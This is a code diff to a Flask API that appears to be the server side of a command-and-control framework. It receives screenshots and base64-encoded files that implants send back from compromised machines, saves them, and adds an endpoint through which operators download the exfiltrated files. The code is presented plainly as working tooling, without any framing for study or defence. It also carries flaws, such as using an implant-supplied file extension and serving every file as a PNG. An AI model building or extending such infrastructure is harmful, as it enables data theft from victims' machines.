@@ -1,7 +1,8 @@
+import os
 import uuid
 import json
 
-from flask import request, Response
+from flask import request, Response, send_file
 from flask_restful import Resource
 from database.db import initialize_db
 from database.models import Task, Result, Implant
@@ -57,8 +58,6 @@ class Results(Resource):
     def post(self):
         implant_id = get_jwt_identity()
         body = request.get_json()
-        print(body['task_id'])
-        
         if not implant_id:
             return Response("Unauthorized", mimetype="application/json", status=401)
         if 'task_id' not in body:
@@ -75,12 +74,13 @@ class Results(Resource):
             img = Image.open(BytesIO(img_bytes))
             img.save(f"images/{task.task_id}.png")
             body['result'] = f"images/{task.task_id}.png"
+
         elif task.task_type == "upload":
             print(body['result'])
             fileString= json.loads(body['result']).get('file_data',"")
             file_bytes = base64.b64decode(fileString)
             extention= json.loads(body['result']).get('file_path','').split('.')[-1]
-
+            body['result'] = f"uploads/{task.task_id}.{extention}"
             with open(f"uploads/{task.task_id}.{extention}", "w") as f:
                 f.write(file_bytes.decode())
                 
@@ -100,5 +100,18 @@ class implants(Resource):
         
         return Response(res, mimetype="application/json", status=200)
 
+class files(Resource):
+    @jwt_required()
+    def get(self):
+        task_id = request.args.get('task_id')
+        if not task_id:
+            return Response("Task ID not provided", mimetype="application/json", status=400)
+        path_to_file = Result.objects(task_id=task_id).first().result
 
+        if not path_to_file or not os.path.isfile(path_to_file):
+            return Response("Invalid path", mimetype="application/json", status=401)
+        
+        response = send_file(path_to_file, mimetype='image/png')
+        response.headers['X-File-Path'] = path_to_file
+        return response
         
